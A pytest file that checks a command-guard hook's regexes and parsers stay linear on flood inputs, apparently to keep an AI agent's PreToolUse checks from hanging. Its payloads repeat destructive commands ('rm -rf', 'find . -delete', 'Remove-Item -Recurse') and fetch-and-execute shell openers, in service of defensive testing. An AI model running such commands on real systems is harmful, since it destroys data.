    # The shapes that actually blew up: a flag, and a flag with an argument.
    tokens += [f"{w} -i " for w in wrappers]
    tokens += [f"{w} -n 10 " for w in wrappers]
    # C76 (DEF-3012, DEF-3030): the binary words in another case with their
    # suffix, and the home-relative directory before a verb
    tokens += [f"{w.upper()}.EXE " for w in wrappers]
    tokens += ["~/a ", "~a/ ", "~/"]
    tokens += [f"{k} " for k in keywords]
    # DEF-3042: a flag whose argument ends in a slashed wrapper name. The
    # `(?<=/)` arm starts a run inside every such word, and until its run
    # declined the word as a flag's argument each start read to the end
    # (quadratic, not exponential: the budget's 30 KB is what makes it red).
    # Derived from the declined roster, which leaves out `watch` and
    # `script` (carrier verbs, DEF-3050); the glued and numeric arms are
    # DEF-3051's.
    declined = _re.findall(r"[a-z]+", _bash_patterns._CMD_POS_WRAPPER_BUILTINS
                           + _bash_patterns._CMD_POS_SLASHED_DECLINED_BINARIES)
    tokens += [f"-x /a/{w} " for w in declined]
    # the decline's case, suffix and blank: a lowercase-only, suffix-blind
    # or space-only decline passed every other row (the code review's mutants)
    tokens += [f"-x /a/{w.upper()}.EXE " for w in declined]
    tokens += ["-x\t/a/env\t"]
    return tokens


_PREFIX_RUN_TOKENS = _prefix_run_tokens()


@pytest.mark.parametrize("token", _PREFIX_RUN_TOKENS)
def test_cmd_pos_linear_on_repeated_prefix_run(token):
    """`_CMD_POS` stays linear on a long run of any prefix token it accepts.

    Driven against a FAILING tail: a successful match short-circuits and hides
    the blowup, which is exactly why the defect went unmeasured.
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _bash_patterns

    probe = token * (_WORST_CASE_BODY_LEN // max(len(token), 1)) + "cp /a /b"
    rx = re.compile(_bash_patterns._CMD_POS + r"zzz\b")

    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        rx.search(probe)
    except _Timeout:
        pytest.fail(
            f"_CMD_POS exceeded {_CI_SAFE_BUDGET_MS}ms on a repeated {token!r} "
            "prefix run — catastrophic backtracking in the command-position "
            "fragment hangs every PreToolUse call"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    elapsed_ms = (time.time() - t) * 1000
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
        f"_CMD_POS took {elapsed_ms:.1f}ms on a {token!r} run "
        f"(budget {_CI_SAFE_BUDGET_MS}ms)"
    )


@pytest.mark.parametrize("arm,unit", [
    ("_FETCH_EXEC_PROCSUB_RE", "env -i bash <( "),
    ("_FETCH_EXEC_SUBST_RE", 'env -i bash -c "$('),
    # DEF-3072: the shell arms read switches now, so a valued switch reaches
    # deeper before failing (about twice the bare row's time, driven)
    ("_FETCH_EXEC_PROCSUB_RE", "env -i bash -o pipefail <( "),
    ("_FETCH_EXEC_SUBST_RE", 'env -i bash -o pipefail -c -- "$('),
], ids=["procsub", "subst", "procsub-valued-switch", "subst-valued-switch"])
def test_the_fetch_arms_inner_position_does_not_compound_the_anchor(arm, unit):
    """DEF-3033: the speed bump's substitution arms read the fetch verb at a
    second command position behind their opener. Composing the whole
    `_CMD_POS` there read cubic on a failing match, because the anchor's
    redirect target (`<` then `(`) and wrapper flag argument (`-c` then
    `"$(`) carry one inner attempt across every later opener: at 150 repeats
    about 1.6 and 2.8 s against the base arms' 37 and 62 ms (the dispatcher's
    verifier on the Air, 8c1237, measured 3.9 and 6.6 s at 200). The narrowed
    inner run (`_speedbump._FETCH_INNER_POS`) reads both quadratic at about
    1.5 times the base, which the outer anchor alone costs (DEF-3044); this
    size is one the base clears and the full composition does not.
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _speedbump

    probe = unit * 150 + "x"
    rx = getattr(_speedbump, arm)
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        rx.search(probe)
    except _Timeout:
        pytest.fail(
            f"{arm} exceeded {_CI_SAFE_BUDGET_MS}ms on {unit!r} * 150: the inner "
            "position compounds the outer anchor again"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    elapsed_ms = (time.time() - t) * 1000
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
        f"{arm} took {elapsed_ms:.1f}ms on {unit!r} * 150 (budget {_CI_SAFE_BUDGET_MS}ms)"
    )


def test_reconstructor_resolves_a_sibling_module_fragment(tmp_path):
    """A cross-module fragment reference must RESOLVE, not fail closed.

    `_speedbump` composes `_bash_patterns._CMD_POS`. Before the reconstructor
    understood attribute access, four safe patterns came back unresolved and the
    gate failed closed on them — correct behaviour, but the remedy is to teach
    the reconstructor, not to allowlist away the proof.
    """
    f = tmp_path / "probe.py"
    f.write_text(
        "import re\nimport _bash_patterns\n"
        "_X = _bash_patterns._CMD_POS + r'git\\b'\n"
        "R = re.compile(_X)\n",
        encoding="utf-8",
    )
    patterns = [p for _, p in _iter_hook_compiled_patterns(f)]
    assert patterns and patterns[0] is not None, "sibling fragment failed to resolve"
    import _bash_patterns as _bp
    assert patterns[0] == _bp._CMD_POS + r"git\b"


def test_reconstructor_fails_closed_on_a_non_sibling_attribute(tmp_path):
    """The widening must not become a hole: an attribute on anything that is not
    a sibling hook module still yields None (gate fails closed)."""
    f = tmp_path / "probe2.py"
    f.write_text(
        "import re\nimport os\nR = re.compile(os.sep + '.*')\n", encoding="utf-8"
    )
    assert [p for _, p in _iter_hook_compiled_patterns(f)] == [None]


def test_reconstructor_fails_closed_on_unknown_sibling_name(tmp_path):
    """A sibling module that exists but lacks the referenced name fails closed."""
    f = tmp_path / "probe3.py"
    f.write_text(
        "import re\nimport _bash_patterns\n"
        "R = re.compile(_bash_patterns._NO_SUCH_FRAGMENT)\n",
        encoding="utf-8",
    )
    assert [p for _, p in _iter_hook_compiled_patterns(f)] == [None]


# ── DEF-794: the shapes the root-shape fix touched ─────────────────────────
# The redirect operator gained `>|`, the leading-redirect gate inside every
# `_CMD_POS`-anchored arm gained a quote-aware target run, and the perl open
# path class admits spaces. Each is driven on the flood its own shape invites:
# an unterminated quote after the operator, and the operator repeated. The
# extractor is driven whole on the same floods, because the raw-operand
# reader that follows each match does a BOUNDED find for a quote's close.
_ROOT_SHAPE_TARGETS = [
    ("redirect-quote-flood", _REDIRECT_RE, '>"' * (_WORST_CASE_BODY_LEN // 2)),
    ("redirect-unterminated-quote", _REDIRECT_RE, '> "' + "a" * _WORST_CASE_BODY_LEN),
    ("redirect-clobber-flood", _REDIRECT_RE, '>| "a" ' * (_WORST_CASE_BODY_LEN // 7)),
    # ⚠ FAILING tails (`zzz`), and ONE LONG BARE TARGET as well as floods: a
    # matching tail short-circuits and hides the blowup, and the first cut of
    # these rows both ended in `cp x y` and spaced the operator from the target
    # (which the gate then forbade), so a 428-green suite shipped a gate that
    # hung for twenty seconds on a thirty-character target (both reviews).
    ("gate-quoted-flood", _CP_MV_RE, '>"a b" ' * (_WORST_CASE_BODY_LEN // 7) + "zzz"),
    ("gate-unterminated-quote", _CP_MV_RE,
     '>"' + "a b " * (_WORST_CASE_BODY_LEN // 4) + "zzz"),
    ("gate-clobber-flood", _TEE_RE, '>| a ' * (_WORST_CASE_BODY_LEN // 5) + "zzz"),
    ("gate-bare-run-30", _CP_MV_RE, ";>" + "a" * 30 + " zzz"),
    ("gate-bare-run-512", _CP_MV_RE, ";>" + "a" * 512 + " zzz"),
    ("gate-bare-run-8000", _CP_MV_RE, ";>" + "a" * 8000 + " zzz"),
    ("gate-spaced-bare-run", _CP_MV_RE, ";> " + "a" * 8000 + " zzz"),
    ("gate-spaced-flood", _CP_MV_RE, "> a " * (_WORST_CASE_BODY_LEN // 4) + "zzz"),
    ("perl-open-space-run", _bash_patterns._PERL_OPEN_RE,
     "open(F,'>" + " a" * (_WORST_CASE_BODY_LEN // 2)),
]


@pytest.mark.parametrize("name,pattern,payload", _ROOT_SHAPE_TARGETS)
def test_root_shape_regexes_linear_on_their_own_floods(name, pattern, payload):
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        pattern.findall(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{name} regex exceeded {_CI_SAFE_BUDGET_MS}ms on its flood payload")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{name} took {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("name,payload", [
    ("extractor-redirect-quote-flood", '>"' * (_WORST_CASE_BODY_LEN // 2)),
    ("extractor-unterminated-quote", 'echo x > "' + "a " * (_WORST_CASE_BODY_LEN // 2)),
    ("extractor-gate-quoted-flood", '> "a b" ' * (_WORST_CASE_BODY_LEN // 8) + "cp x y"),
])
def test_bash_extractor_linear_on_root_shape_floods(name, payload):
    """The whole Bash extractor, raw-operand readers included, on the floods
    above: `raw_operand`'s quote extension is a bounded `str.find`, so a
    flood of unterminated quotes costs a bounded scan per match."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        _bash_patterns._candidate_paths_from_bash(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{name}: the extractor exceeded {_CHAIN_CEILING_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS, f"{name} took {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("shape", [
    "path_space_run", "path_printable_run", "mode_run", "layer_run", "my_run", "handle_run",
])
def test_perl_open3_re_linear_through_the_chain(shape):
    """DEF-813: the three-argument perl open through the live extraction
    chain (`_PERL_DASH_E_RE` -> the inner table), on every run the pattern
    admits -- an unclosed path after the second comma (the two-argument
    killer's shape), a mode-character run (bounded at two, so no split), a
    `:`-led layer run (bounded at 64), a `my ` run before the handle and a
    handle-character run -- each closed by the outer double quote so the
    head arm matches and the inner arm runs."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    from _bash_patterns import _candidate_paths_from_bash  # noqa: E402

    n = 16000
    body = {
        "path_space_run": "open(my $fh, '>', '" + " " * n,
        "path_printable_run": "open(my $fh, '>', '" + "a" * n,
        "mode_run": "open(my $fh, '" + ">" * n,
        "layer_run": "open(my $fh, '>:" + "a" * n,
        "my_run": "open(" + "my " * (n // 3) + ", '>', 'x",
        "handle_run": "open(" + "h" * n + ", '>', 'x",
    }[shape]
    command = 'perl -e "' + body + '"'
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        _candidate_paths_from_bash(command)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"_candidate_paths_from_bash exceeded {_CI_SAFE_BUDGET_MS}ms on the perl three-argument {shape} payload")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{shape}: {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("shape", ["head_flood", "root_flood", "predicate_flood", "git_preopt_flood"])
def test_find_delete_tier_linear_through_the_chain(shape, tmp_path):
    """DEF-815: the catastrophic find tier runs the opener over the masked
    scan, the directory chain over the statements and the root classifier
    over every root, so a flood of any of the three must stay under the
    per-consumer budget through the live entry point (the wall runs even
    under maintenance mode, so a slow path here is a slow hook for every
    Bash call). Each statement stays under the opener's 512-character span
    so the root and predicate floods really reach the classifier (review:
    a single 30 KB statement fell outside the span and timed only the
    pre-check). The fourth shape is DEF-814's review: a repeated git head
    with a global-option run before the subcommand, through the write
    extractor."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _bash_patterns as bp

    n = _WORST_CASE_BODY_LEN
    command = {
        "head_flood": ("find . -delete; " * (n // 16))[:n],
        "root_flood": ("find " + ("a/" * 200) + " -delete; ") * (n // 420),
        # attribute tests never narrow, so every statement's root still
        # reaches the classifier (a `-name` flood would be a sweep)
        "predicate_flood": ("find . " + ("-type f " * 50) + "-delete; ") * (n // 420),
        "git_preopt_flood": ("git -C x " * (n // 9)) + "checkout -- tools/cc/hooks/x.py",
    }[shape]
    if shape == "git_preopt_flood":
        signal.signal(signal.SIGALRM, _alarm)
        signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
        t = time.time()
        try:
            bp._candidate_paths_from_bash(command)
            elapsed_ms = (time.time() - t) * 1000
        except _Timeout:
            pytest.fail(f"write extractor exceeded {_CI_SAFE_BUDGET_MS}ms on a git global-option flood")
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"git_preopt_flood took {elapsed_ms:.1f}ms"
        return
    if shape != "head_flood":
        assert sum(1 for _ in bp.iter_unnarrowed_find_delete_roots(command)) >= 60, shape
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        bp.has_catastrophic_find_delete(command, str(tmp_path), cwd=tmp_path)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"find tier ({shape}) exceeded {_CI_SAFE_BUDGET_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"find tier ({shape}) took {elapsed_ms:.1f}ms"


def test_the_nested_run_the_gate_once_carried_is_caught_by_these_rows():
    """The must-trip witness: the first cut's fragment -- a bare RUN inside the
    `+`, i.e. `(a+)+` -- blows the budget on the bare-run row above, so the
    row is proven to reach the shape it budgets (a row that cannot fail is
    not a gate)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _bash_patterns as bp

    nested = bp._CMD_POS_REDIRECT.replace(
        r"[^\s;|&\"'])+[ \t]+", r"[^\s;|&\"']+)+[ \t]+")
    assert nested != bp._CMD_POS_REDIRECT, "the live fragment is not the single-character form"
    anchor = bp._CMD_POS.replace(bp._CMD_POS_REDIRECT, nested)
    rx = re.compile(anchor + r"zzz\b")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, 0.5)  # wall-clock-exempt: must-trip witness, the alarm firing is the pass
    try:
        rx.search(";>" + "a" * 26)          # no trailing blank: the tail FAILS, so it backtracks
    except _Timeout:
        return  # the witness fired: the row reaches the shape
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    pytest.fail("the nested-run fragment finished within half a second: the row no longer reaches the shape")


@pytest.mark.parametrize("label, build", [
    ("a loop-dense command near the scan cap", lambda: "for f in a b c; do echo x; done; " * 850),
    ("a loop past the cap, padded far beyond it", lambda: "for f in a; do echo x; done; echo " + "y " * 100000),
])
def test_the_discard_snapshot_arm_stays_within_budget(tmp_path, label, build):
    """DEF-837's lane gave the discard-snapshot arm the loop reader: every
    command that names a delete verb now also pays a loop scan. Both reviews
    flagged the cost (a 128k-word list measured 5.0 s through the arm before
    the loop reading was CAPPED as the wall's readers are). The arm, end to
    end, on a loop-dense command and on one padded far past the cap, stays
    inside the chain ceiling; a row that cannot fail is not a gate, so the
    text carries a delete verb and the loop witness each time."""
    import _speedbump

    command = build() + "; rm -f z"
    assert "do " in command and "rm " in command
    t = time.time()
    _speedbump._removal_snapshot_targets("Bash", {"command": command}, tmp_path)
    elapsed_ms = (time.time() - t) * 1000
    assert elapsed_ms < _CHAIN_CEILING_MS, f"{label}: {elapsed_ms:.1f}ms"


# The three rows below time a WALK -- a live judge or pre-pass over a flood at
# the command cap -- and until 2026-09-23 asserted the regex rows' 1 s budget,
# which the `_WALKER_CEILING_MS` comment above already explains is the wrong
# ceiling for a consumer whose floor is hundreds of milliseconds. Measured on
# the self-host Air (min / max of five, warm): the chain row's heredoc flood
# 577 / 871 ms, gone_flood 284 / 317, capped_middle 120 / 124, ps_block 34 / 40;
# the Bash pre-pass row about 500 ms, the PowerShell one's four floods under
# 400 ms each. A shared ubuntu runner read about 1.65x this box on two Release
# CI runs the same day, and the heredoc flood crossed 1 s on the second
# (run 35926017352) after passing the first -- a flake by margin, not a
# regression. They assert the walker tier's ceiling, and since 2026-09-24 the
# heredoc flood IS that tier's recorded floor (`_WALKER_FLOOR_MS`): ten times
# it, so a loaded runner cannot red a linear walk, and far under the minutes a
# quadratic one costs.
@pytest.mark.parametrize("shape", ["gone_flood", "capped_middle", "heredoc_flood", "ps_block_flood"])
def test_the_delete_walk_stays_linear_through_the_chain(shape, tmp_path):
    """The lane's review (its cost finding): the directory walk's removed set
    grows one entry per removal and every directory verb asks it, a patterned
    entry through an fnmatch per ancestor; past the scan cap the whole command
    is masked once for the middle; the walk reads every heredoc body and every
    PowerShell block. Each flood PRE-REGISTERS that its stressor reaches the
    walk (the counts below), then is timed through the live entry point under
    the per-consumer budget -- the wall runs even under maintenance mode, so a
    slow path here is a slow hook, and a hook timeout lets the command run."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _bash_patterns as bp

    n = _WORST_CASE_BODY_LEN
    tool = "Bash"
    if shape == "gone_flood":
        command = "".join(f"rm -rf a{i}x*; cd b{i}; " for i in range(n // 22))
        assert command.count("; cd b") >= 1000 and command.count("rm -rf a") >= 1000
    elif shape == "capped_middle":
        # past the 32 KB cap, under the masker's own 64 KB one: the whole
        # command is masked for the middle
        command = "echo x; " * 7500 + "rm -rf ./build"
        assert bp._BASH_COMMAND_CAP < len(command) <= bp._ROLE_MAP_CAP
        assert bp._capped_whole(command) is not None
    elif shape == "heredoc_flood":
        command = "".join(f"cat <<'E{i}'\nline\nE{i}\n" for i in range(n // 22)) + "rm -rf ./build"
        assert len(bp._heredoc_body_spans(command)) >= 1000
    else:
        tool = "PowerShell"
        command = "& { Set-Location a }; " * (n // 22) + "Remove-Item -Recurse ./build"
        assert command.count("{ Set-Location") >= 1000
    judge = bp.has_catastrophic_recursive_rm if tool == "Bash" else bp.powershell_recursive_removal_is_catastrophic
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _WALKER_CEILING_MS / 1000.0)
    t = time.time()
    try:
        judge(command, str(tmp_path), tmp_path)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{shape}: the delete walk exceeded {_WALKER_CEILING_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _WALKER_CEILING_MS, f"{shape}: {elapsed_ms:.1f}ms"


class TestSedOptionRunIsLinearOnQuotedTokens:
    """The option run of `_SED_INPLACE_RE` once admitted the quote characters
    to its char-class arm, so a quoted token had two parses and the bounded
    outer repeat explored 2^k of them: a benign `sed -e 's/a/b/' x17 README.md`
    took seven seconds and `'a' x20 'b` fifty-nine, in the PreToolUse path
    (the 2-A review drove it; the roster above floods single characters and
    never a run of balanced quoted tokens, so it could not see this shape).
    Measured after the fix: 0.03 ms at k=17."""

    @staticmethod
    def _time(command: str) -> float:
        import time
        t0 = time.perf_counter()
        _SED_INPLACE_RE.search(command)
        return time.perf_counter() - t0

    def test_balanced_quoted_expressions_with_no_flag_are_fast(self):
        for k in (17, 25, 40):
            command = "sed " + "-e 's/a/b/' " * k + "README.md"
            assert self._time(command) < 0.5, k

    def test_an_unterminated_quote_after_many_quoted_tokens_is_fast(self):
        command = "sed " + "'a' " * 20 + "'b"
        assert self._time(command) < 0.5


@pytest.mark.parametrize("label,payload", [
    # §C66: the secret legs' quote-aware word cut and the walk that asks
    # whether a statement boundary sits inside a quote, on floods of quote
    # pairs, of separator runs and of boundaries inside quotes, each ending on
    # a quote that never closes. Both are loops with one anchored match per
    # quote or separator run; measured 6 ms and 3 ms on the 30 KB PowerShell
    # list on a loaded Windows host (2026-10-05), so the regex tier's line.
    ("quote_pairs", '"a b" ' * (_WORST_CASE_BODY_LEN // 6) + "'x"),
    ("separator_run", "c;" * (_WORST_CASE_BODY_LEN // 2) + '"x'),
    ("ps_list", "'a b'," * (_WORST_CASE_BODY_LEN // 6) + "'x"),
    ("boundary_in_quotes", "'a; b' " * (_WORST_CASE_BODY_LEN // 7)),
])
def test_secret_leg_word_cut_linear(label, payload):
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        write_guard._quote_aware_words(payload, write_guard._TOKEN_SPLIT_RE, write_guard._BASH_OPAQUE)
        write_guard._quote_aware_words(payload, write_guard._PS_SECRET_TOKEN_SPLIT_RE, write_guard._PS_OPAQUE)
        write_guard._a_boundary_sits_in_a_quote(payload, write_guard._STATEMENT_BOUNDARY_RE)
        write_guard._a_boundary_sits_in_a_quote(payload, write_guard._PS_STATEMENT_BOUNDARY_RE)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{label}: the secret legs' word cut exceeded {_CI_SAFE_BUDGET_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label}: {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("label,payload", [
    # DEF-5106: the Bash secret leg reads each substitution's body once, at
    # its own level, a nested one held there as one word, so a nest of
    # openers that never closes, one that closes, a run of closed spans of
    # each opener and floods of each quote kind stay linear end to end: the
    # walk, then the statement read of every body it returns.
    ("nested_open", "$(cat " * (_WORST_CASE_BODY_LEN // 6)),
    ("nested_closed", "$(cat " * (_WORST_CASE_BODY_LEN // 12) + ")" * (_WORST_CASE_BODY_LEN // 12)),
    ("spans", "$(cat a) " * (_WORST_CASE_BODY_LEN // 9)),
    ("backticks", "`cat a` " * (_WORST_CASE_BODY_LEN // 8)),
    ("process", "<(cat a) =(cat a) " * (_WORST_CASE_BODY_LEN // 18)),
    ("single_quoted", "'$(' " * (_WORST_CASE_BODY_LEN // 5)),
    ("double_quoted", '"$(a)' * (_WORST_CASE_BODY_LEN // 5)),
    ("ansi_c", "$'\\'$(" * (_WORST_CASE_BODY_LEN // 6)),
    ("comments", "# $(\n" * (_WORST_CASE_BODY_LEN // 5)),
])
def test_secret_leg_substitution_bodies_linear(label, payload):
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        for body in write_guard._substitution_bodies(payload):
            write_guard._secret_statement_reads(body)
        write_guard._substitution_bodies(payload, heredoc=True)
        # the costliest new path: an unquoted heredoc's lines, each body read
        # by the whole leg one level down
        write_guard._secret_read_targets("cat <<EOF\n" + "$(date)\n" * (_WORST_CASE_BODY_LEN // 40) + "EOF")
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{label}: the secret leg's substitution walk exceeded {_CI_SAFE_BUDGET_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label}: {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("label,payload", [
    # DEF-4109: the walk reads each heredoc body bash reads and resumes past
    # its delimiter, and the statement read meets every line after it and
    # every statement after a lone `&`. Floods of terminated heredocs, of
    # operators on one line, of one long body full of quotes and openers, of
    # operators no body closes, of heredocs nested in substitutions (bare and
    # in double quotes), of here-strings, lone `&` and lone redirects: the
    # walk, the blanking, the statement read of the text and of every body
    # (about 22 ms at most on the Air, 2026-11-13). The masker and the
    # descent into each body are left out here; the whole leg on the
    # commit idiom is the cell below.
    ("lone_amp", "a& " * (_WORST_CASE_BODY_LEN // 3)),
    ("terminated_heredocs", "cat <<A\nA\n" * (_WORST_CASE_BODY_LEN // 10)),
    ("ops_on_one_line", "cat " + "<<A " * (_WORST_CASE_BODY_LEN // 8) + "\n" + "A\n" * (_WORST_CASE_BODY_LEN // 8)),
    ("one_long_body", "cat <<'E'\n" + "it's `x` $(y)\n" * (_WORST_CASE_BODY_LEN // 15) + "E\ncat x"),
    ("unterminated_ops", "cat <<A\n" * (_WORST_CASE_BODY_LEN // 8)),
    ("nested_heredoc_subst", "x=$(cat <<E\n" * (_WORST_CASE_BODY_LEN // 12) + "E\n)" * (_WORST_CASE_BODY_LEN // 12)),
    ("heredoc_in_quote", 'echo "$(cat <<E\n' * (_WORST_CASE_BODY_LEN // 16) + 'E\n)"' * (_WORST_CASE_BODY_LEN // 16)),
    ("here_strings", "cat <<<x\n" * (_WORST_CASE_BODY_LEN // 9)),
    ("lone_redirects", "< a " * (_WORST_CASE_BODY_LEN // 4)),
])
def test_secret_leg_heredoc_bodies_and_background_steps_linear(label, payload):
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        heredocs: list = []
        bodies = write_guard._substitution_bodies(payload, heredocs=heredocs, source=payload)
        text = write_guard._without_heredoc_bodies(payload, heredocs) if heredocs else payload
        write_guard._secret_statement_reads(text)
        for body in bodies:
            write_guard._secret_statement_reads(body)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{label}: the secret leg's heredoc walk exceeded {_CI_SAFE_BUDGET_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label}: {elapsed_ms:.1f}ms"


def test_secret_leg_whole_on_a_long_commit_message_linear():
    # DEF-4109: the commit idiom with a 30 KB message full of apostrophes,
    # backticks and `$(`, through the whole Bash secret leg (the masker, the
    # walk, every program reader and the descent into the substitution's
    # body, which a quoted body leaves). About 120 ms on the Air, 2026-11-13;
    # main 37 ms on a plainer message of the same length, as this lane.
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    command = ("git commit -m \"$(cat <<'EOF'\n" + "it's `x` and $(y) here\n" * (_WORST_CASE_BODY_LEN // 23)
               + "EOF\n)\"")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        write_guard._secret_read_targets(command)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"the secret leg on a long commit message exceeded {_CI_SAFE_BUDGET_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{elapsed_ms:.1f}ms"


class TestPlanModeBridgeReader:
    """The plan-mode bridge's Markdown reader (``reflect_trigger._steps_from_plan``
    and its siblings) runs over a user-authored plan of any size on every
    approved ``ExitPlanMode``. Its patterns are line-anchored and bounded and
    applied per line after ``splitlines()``, so a 30 KB plan costs one pass
    (0.1-2.1 ms measured 2026-10-09). The shapes come from the bridge's own
    test module so the two files cannot drift; the budget is this file's
    CI-safe ceiling, a thousand times the measured cost -- it catches a
    super-linear pattern, not a slow box."""

    def test_the_reader_stays_under_the_ci_safe_budget_on_every_shape(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "_plan_bridge_shapes", Path(__file__).resolve().parent / "test_reflect_trigger_plan_bridge.py"
        )
        assert spec is not None and spec.loader is not None
        shapes_mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(shapes_mod)
        rt = shapes_mod.rt
        # Floor the hand-written shape table: a table that lost its rows would
        # pass this loop vacuously (docs/FAILURE_MODES.md 18.4).
        assert len(shapes_mod._ADVERSARIAL_PLANS) >= 7
        for name, body in shapes_mod._ADVERSARIAL_PLANS.items():
            assert len(body) >= _WORST_CASE_BODY_LEN, name
            t0 = time.perf_counter()
            assert rt._steps_from_plan(body)
            rt._not_doing_from_plan(body)
            rt._plan_title(body, "")
            elapsed_ms = (time.perf_counter() - t0) * 1000
            assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{name}: {elapsed_ms:.0f} ms on {len(body)} bytes"
